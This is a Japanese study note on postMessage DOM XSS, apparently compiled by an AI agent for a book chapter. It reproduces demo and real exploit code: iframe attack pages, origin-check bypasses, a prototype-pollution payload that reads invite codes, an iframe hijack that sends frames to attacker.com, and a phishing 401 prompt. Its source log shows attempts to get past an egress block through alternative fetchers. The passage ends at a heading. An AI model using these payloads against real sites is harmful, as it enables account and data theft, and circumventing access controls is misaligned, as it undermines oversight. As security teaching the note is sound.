# [39] Jorge Lajara「PostMessage Vulnerabilities（Part I / Part II）」— postMessage DOM XSS 精読ノート

> 想定章: ch07（クライアントサイド postMessage 脆弱性）
> 担当URL（primary）: https://jlajara.gitlab.io/Dom_XSS_PostMessage （Part I）
> 関連URL（primary）: https://jlajara.gitlab.io/Dom_XSS_PostMessage_2 （Part II。Part I 本文から明示的にリンクされる続編）

---

## 取得状況

| URL | 状態 | 取得方法 | 備考 |
|---|---|---|---|
| https://jlajara.gitlab.io/Dom_XSS_PostMessage （Part I, primary） | **failed** | WebFetch / curl / wayback / r.jina.ai すべて拒否 | `jlajara.gitlab.io` ドメイン全体が組織のegressポリシーで 403（`connect_rejected`）。原典本文は直接取得不能。 |
| https://jlajara.gitlab.io/Dom_XSS_PostMessage_2 （Part II, primary） | **failed** | 同上 | 同ドメインのため同様に 403。 |
| https://jlajara.gitlab.io/web/2020/06/12/Dom_XSS_PostMessage.html （Part I 別URL） | **failed** | — | 同ドメイン、403。 |
| https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html （Part II 別URL） | **failed** | — | 同ドメイン、403。 |
| HackTricks「PostMessage Vulnerabilities」README（GitHub raw, HackTricks-wiki/hacktricks 最新版 & b4rdia/HackTricks 旧版） | **full** | `raw.githubusercontent.com` を curl | jlajara の技法を明示的に引用・再現した二次資料。コードイディオムを逐語取得。 |
| HackerOne report #398054「DOM Based XSS in www.hackerone.com via PostMessage」（GitHub mirror: ajaysenr/HackerOne-Disclosed-Reports 他） | **full** | GitHub raw | **Part II が Case 1 として解説している当該レポートの一次全文**。脆弱コード逐語入手。 |
| HackerOne report #381356（Frans Rosén, Marketo race condition。#398054 の関連） | **full** | GitHub raw | 同 Marketo listener を突く関連一次レポート。PoC 逐語入手。 |
| reveal.js `js/reveal.js` @ tag 3.9.1（CVE-2020-8127 の脆弱版） | **full** | GitHub raw | **Part II が Case 2 として扱う reveal.js postMessage の脆弱ハンドラ**を逐語入手。 |
| WebSearch（jlajara Part I / II の構成・narrative） | **partial** | WebSearch（本タスク中に予算上限200/200到達、追加不可） | 原典の節構成・1.html/2.html/3.html デモの概要を要約スニペットとして取得。 |
| **anquanke.com「通过HackerOne漏洞报告学习PostMessage漏洞实战场景中的利用与绕过」（GitHub mirror: wonderkun/crawler）** | **full** | `raw.githubusercontent.com` を curl（本タスク＝補完パス 2026-09-18 で新規入手） | **jlajara Part I / Part II を忠実に再現した中国語解説記事**。jlajara Part I の **1.html/2.html/3.html デモコードを逐語で掲載**しており、原典の当該コードを（再現記事経由で）確定できた。Part II の #398054・**#499030（#398054 のバイパス報告）**・reveal.js #691977（CVE-2020-8127）の 3 ケースを jlajara と同じ構成で解説。原文リンク: https://www.anquanke.com/post/id/219088 |
| reveal.js `js/reveal.js` @ tag 3.9.1 の `addKeyBinding()` / `showHelp()`（GitHub raw） | **full** | `raw.githubusercontent.com` を curl（補完パスで追加取得） | CVE-2020-8127 の**実際の XSS 発火経路**（`addKeyBinding` で未サニタイズの `description` を登録 → `showHelp()` の `innerHTML` に連結される sink）を逐語確認。 |

> **重要な但し書き（補完パス 2026-09-18 で更新）**: 原典 2 本（Part I・Part II、`jlajara.gitlab.io`）は egress ポリシーにより **依然として一切直接取得できていない**（WebFetch/curl/web.archive.org/r.jina.ai すべて 403、WebSearch も 200/200 枯渇のまま）。ただし補完パスで **jlajara Part I / II を忠実に再現した二次記事（anquanke.com、GitHub mirror 経由）を逐語入手**でき、これにより従来「二次情報からの再構成」だった **Part I デモコード（1.html/2.html/3.html）を逐語で確定**（節B'）、および Part II の **#499030 バイパス報告**（節I'）と **reveal.js の実 XSS 経路**（節K を増補）を補えた。したがって現状は、(a) jlajara が扱った一次ソース（H1 #398054/#381356、reveal.js 3.9.1 コード）を GitHub から逐語入手、(b) jlajara の技法をそのまま再現する HackTricks を逐語掲載、(c) **jlajara Part I/II の忠実な再現記事（anquanke.com）を逐語掲載**、で構成される。**anquanke.com は jlajara 本人の英語原文ではなく中国語の再現記事**である点は各所で明記する（コード自体は原典と構造・変数名が一致しており、原典 narrative の再現として信頼できる）。

---

## 要約（3〜10行）

- `window.postMessage()` はウィンドウ間（親↔ポップアップ、親↔iframe など）でクロスオリジン通信を安全に行うためのAPI。実装を誤ると **情報漏洩** または **DOM-based XSS** につながる。
- Part I は入門編：postMessage とは何か／基本的な脆弱パターン（受信側が `origin` を検証せず、受信データを危険なsink（`location.href`/`<a href>`/`innerHTML` 等）に流す）／検出方法／緩和策を扱う。
- 典型デモ: 受信ページ（jlajara の例では `2.html`）が `origin` 未検証で受信データを `<a href>` に代入 → 攻撃ページ（`3.html`）が `2.html` を iframe 化し `postMessage({url:"javascript:prompt(1)"})` を送る → リンククリックで JS URI が発火。
- Part II は実戦編：3 ケースを解析。(1) HackerOne #398054（Marketo forms2.js の origin 未検証 `message` listener、`followUpUrl`→`location.href` で DOM XSS）、(2) **その修正（`0===i.indexOf(origin)` という誤った向きの検証）を破る #499030**（`.ma` ドメインで前方一致を満たす。節I'）、(3) reveal.js #691977（`config.postMessage` 有効時に任意の `Reveal[method]` を postMessage で呼べる → `addKeyBinding` で未サニタイズ `description` を登録 → `showHelp/toggleHelp` の `innerHTML` で発火、CVE-2020-8127。節K）。※補完パスで #499030 と reveal.js の実発火経路を追記。
- 検出は「JS を読む」以外に王道なし。`window.addEventListener('message', ...)` / `$(window).on('message',...)` を grep し、データフローを sink まで追う。DevTools の `getEventListeners(window)` や Elements→Event Listeners、ブラウザ拡張（posta / postMessage-tracker）も併用。
- 緩和は `event.origin`（必要なら `event.source`）の厳格検証と、受信データのsink直前でのスキーマ・URLスキーム検証。`indexOf()`/`search()`/`match()` による緩い origin チェックは容易にバイパスされる。

---

## 詳細ノート

### 節A. postMessage とは何か（出典: jlajara Part I の導入 / 二次情報 + 〔補足（一般知識）〕）

- `window.postMessage()` メソッドは、Window オブジェクト間（例: あるページと、そのページが開いたポップアップの間、あるいはページとその中に埋め込まれた iframe の間）のクロスオリジン通信を **安全に** 行えるようにする（原典 Part I の導入文の趣旨。WebSearch 要約より）。
- postMessage が正しく実装されていない場合、情報漏洩やクロスサイトスクリプティング（XSS）につながりうる、というのが Part I 冒頭の主題。
- Part I は「postMessage とは何か、基本的な悪用（basic exploitation）、検出（detection）、緩和（mitigation）」への導入、と原典は自己紹介している（WebSearch 要約より逐語に近い形で確認）。

〔補足（一般知識）〕postMessage の送信 API シグネチャは `targetWindow.postMessage(message, targetOrigin, [transfer])`。受信は `window.addEventListener("message", handler)`。受信ハンドラに渡る `MessageEvent` は主に `event.data`（送信ペイロード）、`event.origin`（送信元オリジン文字列）、`event.source`（送信元 Window 参照）を持つ。脆弱性の本質は「受信側が `origin` を検証せず、`event.data` を危険なsink（`eval`, `innerHTML`, `location`/`location.href`, `<a>.href`, `document.write`, `setTimeout` 文字列, `Function` 等）に渡す」こと。

#### 送信 API の各種パターン（出典: HackTricks「Send PostMessage」節・逐語）

> 以下は HackTricks（jlajara の技法を再現した二次資料）の逐語。jlajara Part I が示す送信イディオムと同一。

```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to a URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```

`targetOrigin` は `'*'`（ワイルドカード）か `https://company.com` のような厳密オリジンを指定できる。厳密オリジンにした場合、送信先 Window が現在そのオリジンを持つ時だけブラウザがメッセージを配送する。`'*'` の場合は送信先 Window の現在のオリジンに関係なく配送される（＝任意ドメインに届きうる）。この非対称性が「ワイルドカード送信＋iframe乗っ取り」による情報漏洩（後述）の根源。

---

### 節B. 基本の脆弱パターン（Part I の 1.html/2.html/3.html デモ）（出典: jlajara Part I / 二次情報からの再構成）

> **注意（補完パス 2026-09-18 で更新）**: 当初この節は WebSearch 要約と HackTricks イディオムからの「再構成 narrative」だった。**補完パスで、直下の節B' に 1.html/2.html/3.html の逐語コードを確定した**（jlajara Part I を忠実再現した anquanke.com 記事より）。再構成と逐語は一致していた。以下の再構成は「原理の平易な説明」として残すが、**厳密な逐語は節B' を正**とすること。

原典 narrative（WebSearch 要約で確認できた事実関係）:

- `2.html` は `origin` を検証せずに `message` を受信している。
- 受信した `event.data` の中の URL 値（例では `msg.url`）を、ページ内の `<a href>`（「Go back」リンク）に代入する。
- したがって攻撃者は `3.html` をホストし、その中で `2.html` を iframe として読み込み、`onload` 契機で `postMessage()` を呼び、悪意ある `msg = {url : "javascript:prompt(1)"}` を送る。
- `2.html` は処理後 `<a href>` の値を `msg.url` の値に書き換える。ユーザーが「Go back」リンクをクリックすると、`javascript:` URI が実行され XSS が発火する。

〔補足（一般知識）〕この構造を一般化した「最小の脆弱受信側」と「最小の攻撃側」は概念的に次の形になる（これは原典逐語ではなく、原理を示すための一般的サンプル）:

```html
<!-- 概念図（原典逐語ではない）: origin 未検証の受信側 -->
<a id="go_back">Go back</a>
<script>
  window.addEventListener("message", function (event) {
    // ❌ event.origin を検証していない
    document.getElementById("go_back").href = event.data.url; // sink: <a href>
  });
</script>
```

```html
<!-- 概念図（原典逐語ではない）: 攻撃側ページ -->
<iframe id="ifr" src="https://victim.example/2.html" onload="exploit()"></iframe>
<script>
  function exploit() {
    var msg = { url: "javascript:prompt(1)" };
    document.getElementById("ifr").contentWindow.postMessage(msg, "*");
  }
</script>
```

ポイント（原理として確実に言えること）:
- sink が `<a href>` の場合、`javascript:` スキームは「リンククリック」というユーザー操作を1回要する（自動発火ではない）。sink が `location.href`/`location` への直接代入なら操作不要で即ナビゲーション＝即発火になりうる。
- iframe 化できること（`X-Frame-Options`/CSP `frame-ancestors` が無い、または緩い）が前提。iframe 化できない場合は `window.open()`＋`postMessage`（別タブ/別ウィンドウ）に切り替える（後述の X-Frame バイパス節）。

---

### 節B'. 【補完・逐語確定】Part I デモ 1.html / 2.html / 3.html（出典: anquanke.com による jlajara Part I 忠実再現記事・逐語）

> **補完パス 2026-09-18 追記**。節B は当初 WebSearch 要約と HackTricks イディオムからの「再構成」だったが、補完パスで **jlajara Part I を忠実に再現した anquanke.com 記事**（GitHub mirror `wonderkun/crawler` 経由で逐語取得）から、原典 Part I の **1.html / 2.html / 3.html のコードそのもの**を確定できた。以下は当該再現記事に掲載された逐語コード（HTML エンティティを復元したもの）。**節B の再構成が原典と一致していたことがこれで裏付けられた**（`redirection` という id の「Go back」リンク、`javascript:prompt(1)` ペイロード、iframe 化の構造がすべて一致）。ただし出典は jlajara 本人の英語原文ではなく中国語再現記事である点は明記する。

原典 Part I のシナリオ（再現記事の説明）: 「メインサイト `1.html` が `2.html` と通信する。`2.html` には戻るボタン（back button）があり、`1.html` のナビゲーションが変わるとこのボタンの参照先も変わる。例えば `1.html` で `changed.html` に遷移すると、`2.html` の戻るボタンが `changed.html` を指す。これを `postMessage` で `1.html` の値を `2.html` に送って実現する。」

**1.html（送信側・逐語）** — 「Open child」で `2.html` をポップアップし、「Send Message」で `{url:"changed.html"}` をワイルドカード `*` 送信する:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Website 1</title>
 <meta charset="utf-8" />
<script>

var child;
function openChild() {child = window.open('2.html', 'popup', 'height=300px, width=500px');

}
function sendMessage(){
    let msg={url : "changed.html"};
    // In production, DO NOT use '*', use toe target domain
    child.postMessage(msg,'*')// child is the targetWindow
    child.focus();
}</script>
</head>
<body>
    <form>
        <fieldset>
            <input type='button' id='btnopen' value='Open child' onclick='openChild();' />
            <input type='button' id='btnSendMsg' value='Send Message' onclick='sendMessage();' />
        </fieldset>
    </form>
</body>
</html>
```

**2.html（脆弱な受信側・逐語）** — `event.origin` を検証せず（コメントで「Normally you would check event.origin」と書いてあるだけで**実際には検証していない**）、`event.data.url` をテンプレートリテラルで `<a id="redirection">`（「Go back」リンク）の `href` に代入する。ここが sink:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Website 2</title>
    <meta charset="utf-8" />
    <script>
    // Allow window to listen for a postMessage
    window.addEventListener("message", (event)=>{
        // Normally you would check event.origin
        // To verify the targetOrigin matches
        // this window's domain
         document.getElementById("redirection").href=`${event.data.url}`;
        // event.data contains the message sent

    });function closeMe() {
        try {window.close();
        } catch (e) { console.log(e) }
        try {self.close();
        } catch (e) { console.log(e) }}
    </script>
</head>
<body>
    <form>
        <h1>Recipient of postMessage</h1>
            <fieldset>
                <a type='text' id='redirection' href=''>Go back</a>
                <input type='button' id='btnCloseMe' value='Close me' onclick='closeMe();' />
            </fieldset>

    </form>
</body>
</html>
```

**3.html（攻撃側・逐語）** — `2.html` を iframe として読み込み、`contentWindow.postMessage()` で `{url:"javascript:prompt(1)"}` を送る。`2.html` はこれを `<a href>` に代入するので、ユーザーが「Go back」をクリックすると `javascript:` URI が発火して XSS になる:

```html
<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC</title>
 <meta charset="utf-8" />


</head>
<body>

 <iframe id="frame" src="2.html" ></iframe>

 <script>

    let msg={url : "javascript:prompt(1)"};
    var iFrame = document.getElementById("frame")
    iFrame.contentWindow.postMessage(msg, '*');

</script>
</body>
</html>
```

**原典 Part I の緩和（再現記事・逐語）** — 原典は MDN の記述を引き、具体的な直し方として次を示す:
- `1.html` の `child.postMessage(msg,'*')` を `child.postMessage(msg,'2.html')`（＝ワイルドカードを厳密 targetOrigin に）へ。
- `2.html` の受信ハンドラ冒頭に origin 検証を追加:

```javascript
window.addEventListener("message", (event)=>{
    if (event.origin !== "http://safe.com")
    return;
    ...
});
```

**原典 Part I の検出（再現記事・逐語）** — 「postMessage 脆弱性の検出は JavaScript コードを読むことに尽きる。リスナー定義からイベントのデータフローを追い、攻撃されやすい関数（sink）で終わるかを解析する」とした上で、原典 Part I が具体的に挙げる検出ツールは次の 2 つ（※ HackTricks が挙げる posta/postMessage-tracker とは別。原典 Part I 由来はこちら）:
- **J2EEScan**（Burp 拡張。GitHub https://github.com/ilmila/J2EEScan の最新版を使う）
- **BurpBounty**（https://github.com/wagiro/BurpBounty。`postMessage`、`addEventListener("message`、`.on("message"` などのキーワードを受動的に検索する応答文字列ルールを定義して使う）

---

### 節C. addEventListener の悪用と列挙（検出）（出典: HackTricks「addEventListener exploitation」節・逐語）

`addEventListener` は JS が `message` イベントを受け取るハンドラを登録する関数。典型形:

```javascript
window.addEventListener(
  "message",
  (event) => {
    if (event.origin !== "http://example.org:8080") return

    // ...
  },
  false
)
```

ハンドラが最初に **送信元オリジンをチェック** している点が重要。受信データがパスワード変更などの機微な処理を駆動する場合、厳格な origin チェックが無いと、攻撃者は被害者ページに任意のメッセージデータを送り込める。

#### 列挙（Enumeration）— イベントリスナーの見つけ方（逐語）

- JS コードを `window.addEventListener` および `$(window).on`（JQuery 版）で **検索** する。
- DevTools コンソールで実行: `getEventListeners(window)`
- ブラウザ DevTools の _Elements → Event Listeners_ を見る。
- ブラウザ拡張を使う: [Posta](https://github.com/benso-io/posta) や [postMessage-tracker](https://github.com/fransr/postMessage-tracker)。これらは全メッセージを傍受して表示する。

〔補足〕検出に「簡単な自動ツール」は存在しない、と jlajara も述べている（WebSearch 要約）。リスナー定義を見つけたら、`event.data` のデータフローを追い、最終的に危険な関数（sink）に到達するかを人手で解析する必要がある。

---

### 節D. origin チェックのバイパス（出典: HackTricks「Origin check bypasses」節・逐語）

受信側が origin 検証を「文字列メソッド」で雑に実装していると容易にバイパスできる。

- **`event.isTrusted` を送信元認可に使ってはならない。** これは「ブラウザがそのイベントをディスパッチしたか（＝JS の `dispatchEvent` ではないか）」を示すだけで、`MessageEvent` が信頼できるオリジン・真のユーザー操作から来たことを証明しない。`event.origin`（必要に応じ `event.source`）を検証すること。（MDN Event.isTrusted）
- **`indexOf()`** による origin 検証はバイパス可能:

  ```javascript
  "https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
  ```

  （前方一致「含む」だけを見ているため、攻撃者ドメインを部分文字列として満たせる）
- **`search()`**（`String.prototype.search()`）は正規表現を取る。文字列を渡すと暗黙に正規表現へ変換され、正規表現では **ドット(.)がワイルドカード** になるため、特別なドメインで検証をすり抜けられる:

  ```javascript
  "https://www.safedomain.com".search("www.s.fedomain.com")
  ```

- **`match()`** も `search()` 同様に正規表現を処理する。正規表現の組み方が不適切だとバイパスされうる。
- **`escapeHtml`** 関数の欠陥: この関数は新しいエスケープ済みオブジェクトを作らず、既存オブジェクトのプロパティを上書きする。よって `hasOwnProperty` に応答しない制御可能プロパティを持つオブジェクトを作れると、エスケープが効かない。

  期待される失敗（正しくエスケープされる例）:

  ```javascript
  result = u({
    message: "'\"<b>\\",
  })
  result.message // "&#39;&quot;&lt;b&gt;\"
  ```

  バイパス（エスケープが効かない例）:

  ```javascript
  result = u(new Error("'\"<b>\\"))
  result.message // "'"<b>\"
  ```

  `File` オブジェクトはこの悪用に最適で、読み取り専用の `name` プロパティがテンプレートで使われる際に `escapeHtml` を回避する。
- `document.domain` プロパティはスクリプトで短縮設定でき、同一親ドメイン内での同一オリジンポリシーを緩められる。

#### スキーム部分文字列チェックの回避（message→navigation sink）（出典: HackTricks・逐語）

受信側が `event.origin` を検証せず、`event.data` が `http:`/`https:` を **含むか** だけを見て `location.href` に代入する場合、部分文字列チェックは実際の URL スキームを制約しない。値の先頭を `javascript:` にして、必要な部分文字列を JS の行コメントの後ろに置けば、ブラウザは受信側オリジンで先頭の JavaScript URL を実行する。

```html
<iframe
  src="https://target.example/"
  onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
</iframe>
```

ここで `http:` は `indexOf('http:') > -1` フィルタを満たすが、コメントとして無視される。悪用には (1) 対象 Window への参照（iframe 可能ページかポップアップ）、(2) 到達可能なリスナー、(3) `javascript:` URL を許すナビゲーション sink、が必要。

#### 信頼オリジン許可リスト＋信頼リレーの悪用（出典: HackTricks・逐語）

受信側が `event.origin` だけをチェックする（例: `*.trusted.com` を無条件信頼）場合、その信頼オリジン上に「攻撃者制御のパラメータを `postMessage` でエコーするリレーページ」を見つけられることが多い。マーケ/解析ガジェットがクエリパラメータを受け取り `{msg_type, access_token, ...}` を `opener`/`parent` に転送する類。手口:

- **opener を持たせて被害ページをポップアップ/iframe で開く**（多くの pixel/SDK は `window.opener` があるときだけリスナーを登録する）。
- **別の攻撃者ウィンドウを信頼オリジン上のリレーendpointへ遷移**させ、注入したいメッセージフィールド（type, token, nonce）を埋める。
- メッセージが **信頼オリジン発** になるため origin-only 検証を通り、被害リスナーで特権動作（状態変更、API呼び出し、DOM書き込み）を起動できる。

実地の悪用パターン:
- 解析 SDK（pixel/fbevents 系）が `FACEBOOK_IWL_BOOTSTRAP` のようなメッセージを消費し、メッセージ内トークンでバックエンド API を呼び、リクエストボディに `location.href`/`document.referrer` を含める。自前トークンを渡せば、そのトークンのリクエスト履歴で OAuth code/token を読み出せる。
- 任意フィールドを `postMessage` に反射するリレーは、特権リスナーが期待する message type を偽装可能にする。

ハンティングのコツ: `event.origin` だけを見るリスナーを列挙 → 同一オリジンの HTML/JS endpoint で URL パラメータを `postMessage` に転送するもの（マーケプレビュー、ログインポップアップ、OAuth エラーページ）を探す → `window.open()`＋`postMessage` で両者を繋いで origin チェックを回避。

---

### 節E. `e.origin == window.origin` バイパス（null origin）（出典: HackTricks・逐語）

`<iframe sandbox="allow-scripts" src="...">` のような **サンドボックス iframe** に埋め込むと、その iframe の origin は `null` になる。

sandbox に **`allow-popups`** を指定すると、iframe から開いたポップアップは親のサンドボックス制約を継承する（`allow-popups-to-escape-sandbox` を追加しない限り）。よって **null origin の iframe から開いたポップアップの `window.origin` も `null`**。

結果として、popups を許すサンドボックス iframe を開き、その中からポップアップを開き、iframe からポップアップへ `postMessage` を送ると、送信側・受信側の両 origin が `null`。したがって **`e.origin == window.origin == null`（`null == null` が true）** となり、`e.origin == window.origin` という等価チェックを突破できる。

---

### 節F. `e.source` バイパス（出典: HackTricks・逐語）

同じウィンドウ由来かをチェックするコード（ブラウザ拡張の Content Script などで有用）:

```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
  return
}
```

**`e.source` を null に強制**するには、`postMessage` を送信する iframe を作り **即座に削除** すればよい。削除で送信元 Window 参照が失われ、`e.source` が null になる。

---

### 節G. フレーミング保護（X-Frame）バイパス（出典: HackTricks・逐語）

これらの攻撃は理想的には被害ページを `iframe` に入れて行うが、`X-Frame-Options` や CSP `frame-ancestors` が阻む。その場合は、より目立つが有効な手として、新しいタブ/ウィンドウで対象を開いて通信する:

```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```

関連手法（HackTricks が別ページとして扱うもの・名称のみ記録）:
- **Stealing message sent to child by blocking the main page**: メインページを送信前にブロックし、子 iframe 内の XSS で受信前にデータを奪う。
- **Stealing message by modifying iframe location**: X-Frame 無しのページ内の子 iframe の location を攻撃者ページに変更し、ワイルドカード送信のメッセージを横取り。

---

### 節H. postMessage → Prototype Pollution / XSS（出典: HackTricks・逐語。Part II へのリンクを含む）

`postMessage` で送られたデータが JS で実行されるシナリオでは、ページを iframe 化し、`postMessage` 経由で prototype pollution/XSS の exploit を送り込める。

HackTricks は「非常によく解説された postMessage 経由 XSS」として **jlajara Part II**（`https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html`）を明示的に挙げている。

Prototype Pollution → XSS を postMessage で iframe に送る exploit 例（逐語）:

```html
<html>
  <body>
    <iframe
      id="idframe"
      src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
    <script>
      function get_code() {
        document
          .getElementById("iframe_victim")
          .contentWindow.postMessage(
            '{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
            "*"
          )
        document
          .getElementById("iframe_victim")
          .contentWindow.postMessage(JSON.stringify("refresh"), "*")
      }

      setTimeout(get_code, 2000)
    </script>
  </body>
</html>
```

#### ワイルドカード targetOrigin での iframe 攻撃（情報漏洩）（出典: HackTricks・逐語）

iframe 化可能（`X-Frame-Options` 保護なし）で、機微なメッセージをワイルドカード `*` で `postMessage` しているページは、iframe の origin を変更して機微メッセージを攻撃者ドメインに漏洩できる。targetOrigin が URL（非ワイルドカード）に設定されているなら、この手は効かない。

```html
<html>
   <iframe src="https://docs.google.com/document/ID" />
   <script>
      setTimeout(exp, 6000); //Wait 6s

      //Try to change the origin of the iframe each 100ms
      function exp(){
          setInterval(function(){
              window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
          }, 100);
      }
   </script>
```

---

### 節I. 【Part II Case 1・一次全文】HackerOne #398054 — Marketo forms2.js の postMessage DOM XSS

> **これは jlajara Part II が Case 1 として解説している実レポートそのもの**。原典 jlajara は取得できなかったが、当該 HackerOne レポート #398054（報告者 adac95、対象 www.hackerone.com、Bounty $500、報告 2018-08-22 / 開示 2019-02-21、Weakness: XSS-DOM）の全文を GitHub ミラーから逐語入手した。以下、脆弱コードと exploit を逐語で記録する。

**概要**: www.hackerone.com の Marketo コンタクトフォームは、ページに設置された安全でない `message` イベントリスナーにより DOM XSS になる。ただし CSP 等の制約で実際の悪用には条件がある。

**仕組み**: フォームは hackerone.com ウィンドウと埋め込み Marketo iframe の間の message イベントで実装される。`submit` クリックでフォームデータ＋設定情報が Marketo iframe に送られ、iframe がサーバに送信、完了後 Marketo iframe が成否を hackerone.com ウィンドウにメッセージで返す。

hackerone.com 側の message ハンドラ（forms2.js の非圧縮版より。実サイトは minified 版を使用）:

```javascript
$(window).on("message", onMessage);
function onMessage (e){
  if(e.originalEvent && e.originalEvent.data){
    var d;
    try {
      d = $.parseJSON(e.originalEvent.data);
    }catch(ex){
      return;
    }
    if(d.mktoReady){
      onReady();
    }else if(d.mktoResponse){
      onResponse(d.mktoResponse)   
    }
  }
}
```

`message` リスナーは JQuery で登録され `onMessage` を呼ぶ。`onMessage` はデータを文字列→オブジェクトにパースし、`mktoReady` か `mktoResponse` プロパティを見る。**origin チェックが一切ない**のが脆弱点。`mktoResponse` があれば `onResponse` にその値を渡す:

```javascript
function onResponse(mktoResponse){
  var requestId = mktoResponse["for"];
  var request = inflight[requestId];
  if(request){
    if(mktoResponse.error){
      request.error(mktoResponse.data);
    }else{
      request.success(mktoResponse.data);
    }
  }
  delete inflight[requestId];
}
```

`requestId` を `mktoResponse` の `for` プロパティから取り、`inflight` 配列から別オブジェクトを引く。`inflight` はフォーム送信時に作られ、成功/エラー時に呼ばれる 2 つのメソッドを持つ。`error` プロパティが無ければ `success` が `data` 引数で呼ばれる:

```javascript
var success = function (data){
  if(data.error){
    onError(data);
  }else if(data.formId){
    var u = findCorrectFollowUpUrl(data);
    if(false === onSuccess(values, u)){
      return;
    }
    cookieHelper.removeCookieAllDomains("_mkto_purl");
    location.href = u;
  }
}
```

`success` は、エラーが無ければ `u` を `findCorrectFollowUpUrl(data)` の戻り値に設定する。これはレスポンスオブジェクトの `followUpUrl`（送信完了後のリダイレクト先 URL）を処理する。HackerOne フォームでは未使用だったが、これを絶対 URL に設定すると `u` を制御でき、それが後で `location.href` に代入される。次の `mktoResponse` メッセージを Hackerone ウィンドウに送ると、`javascript:` URI に遷移し `alert(document.domain)` が実行される（sink: `location.href = u`）:

```javascript
{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"javascript:alert(document.domain);//","aliId":17144124}}}
```

**制約（重要な現実的注意点）**:
1. `javascript:` URI へのリダイレクトはインライン JS 実行と等価とみなされ、HackerOne の **CSP** にブロックされた。CSP 非対応ブラウザ（IE11 等）なら本来悪用可能だが、サイトが `includes` 関数（IE11 非対応）を使っておりエラーになり IE11 では動かなかった:

```javascript
SCRIPT438: Object doesn't support property or method 'includes'
js_gSD6OxivXJVJaZwXxHUQz15yz9xczqXghcBxuRO0Ieo.js (43,5)
```

2. ユーザーが先に攻撃者サイトを訪れコンタクトフォームを送信する必要がある（`inflight` に success/error を積むため）。関連レポート https://hackerone.com/reports/207042 と同条件。
3. Firefox で CSP を Burp の match&replace（レスポンスヘッダの `^Content-Security-Policy: .*$` 除去）で無効化すると実行できた。PoC は `setInterval` で 250ms ごとに `mktoResponse` ペイロードを送り、正規 Marketo メッセージより先に success を処理させるレース。

**CSP を触らないフィッシング亜種**（basic 認証プロンプトを重ねる）:

```javascript
{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"https://attacker.sometld/401.php","aliId":17144124}}}
```

`401.php` の内容:

```php
<?php
header('WWW-Authenticate: Basic realm="Log in to HackerOne"');
header('HTTP/1.0 401 Unauthorized');
?>
```

Firefox / Microsoft Edge では認証プロンプト表示中も背景に www.hackerone.com が見えるため、別アプリの認証と気づかれにくい。

**修正提案（原文）**: Marketo はリスナーで全メッセージが信頼オリジンから来たかをチェックすべき（marketo.com のサブドメインのホワイトリスト等）。加えて `followUpUrl` の値を HTTP/HTTPS URL に限定検証し、`javascript:` URI へのリダイレクトを防ぐべき。

---

### 節I'. 【補完・Part II Case の続き】#398054 の修正と、その修正の**バイパス** #499030（indexOf 弱検証）

> **補完パス 2026-09-18 追記**。jlajara Part II は #398054 だけでなく「**その修正が施された後のバイパス報告 #499030**」まで解説している。従来ノートは節D で `indexOf` バイパスの一般論と `"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")` という式（HackTricks 由来）を載せていたが、**それが具体的にどの HackerOne 報告（#499030）で、どの修正コードを、なぜ破れるのか**は書かれていなかった。ここで補う。出典は anquanke.com による jlajara Part II 忠実再現記事（逐語）。

**#398054 提出後に Marketo/HackerOne が入れた修正（再現記事・逐語）** — `onMessage` に origin 検証を追加した:

```javascript
if (a.originalEvent && a.originalEvent.data && 0 === i.indexOf(a.originalEvent.origin)) {
    var b;
    try {
        b = j.parseJSON(a.originalEvent.data)
    } catch (c) {
        return
    }
    b.mktoReady ? f() : b.mktoResponse && e(b.mktoResponse)
}
```

ここで `i` は `https://app-sj17.marketo.com/` に解決される。追加された条件 **`0 === i.indexOf(a.originalEvent.origin)`** は「`i`（＝信頼オリジン文字列）が、受信した `origin` を**先頭に含む**か（`origin` が `i` の前方部分文字列か）」を見ている。これは検証方向が逆で、**受信 origin が信頼オリジンの「接頭辞」でありさえすれば通ってしまう**。

**バイパス報告 #499030（再現記事・逐語）** — したがって攻撃者は **`.ma`（モロッコ）ドメイン `app-sj17.ma` を登録**すればよい。すると:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")   // === 0（先頭一致）
```

が `0` を返し、`0 === ...` の条件を満たして検証を通過する。#398054 の攻撃コードを `https://app-sj17.ma` 配下にホストすれば、修正後も XSS が成立する。

**教訓**: origin 検証を `indexOf`（しかも「信頼文字列が受信 origin を含むか」という誤った向き）で書くと、攻撃者が信頼オリジンの前方部分文字列に一致するドメインを取得するだけで破れる。正しくは `event.origin === "https://app-sj17.marketo.com"` の**厳密等価**、または正しくパースした URL origin の比較で行う（節L 参照）。

---

### 節J. 【Part II 関連・一次全文】HackerOne #381356 — Frans Rosén: Marketo postMessage レースで data: へ誘導（Safari）

